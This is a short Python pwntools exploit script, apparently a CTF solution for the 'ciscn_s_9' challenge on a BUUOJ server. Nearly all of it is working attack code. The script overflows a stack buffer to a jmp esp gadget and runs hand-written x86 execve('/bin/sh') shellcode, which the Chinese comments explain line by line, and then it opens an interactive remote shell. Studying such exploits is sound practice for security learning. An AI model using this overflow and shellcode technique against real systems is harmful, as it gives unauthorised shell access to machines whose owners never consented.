#Made by fly_autumn
#x86
from pwn import *
p = process("./ciscn_s_9")
p = remote("node5.buuoj.cn",25284)
elf = ELF("./ciscn_s_9")
context(os="linux",arch="i386",endian="little")

offset = 36
shellcode = asm("sub esp,0x28;call esp")
jmp_esp = 0x8048554

p.recvuntil(b">\n")
payload = '''
xor eax,eax
mov al,0xb
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
push edx
push ebx
mov ecx,esp
int 0x80
'''
#execve("/bin/sh",0,0)
#eax = 0xb,ebx = sh_addr,ecx = 0,edx = 0
#xor eax, eax  将eax设置为0
#mov al, 0x0b  将eax设置为0xb
#xor edx, edx  将edx设置为0
#push edx      字符串截断符
#push 0x68732f2f  hs// -> //sh
#push 0x6e69622f  nib/ -> /bin
#mov ebx, esp  设置ebx位置
#push edx      argv数组终止符
#push ebx      字符串地址压入
#mov ecx, esp  ecx指向argv数组
#int 0x80      触发系统调用
payload = asm(payload)
payload = payload.ljust(0x24,b"\x00")
payload += p32(jmp_esp) + bytes(shellcode)
p.sendline(payload)

p.interactive()
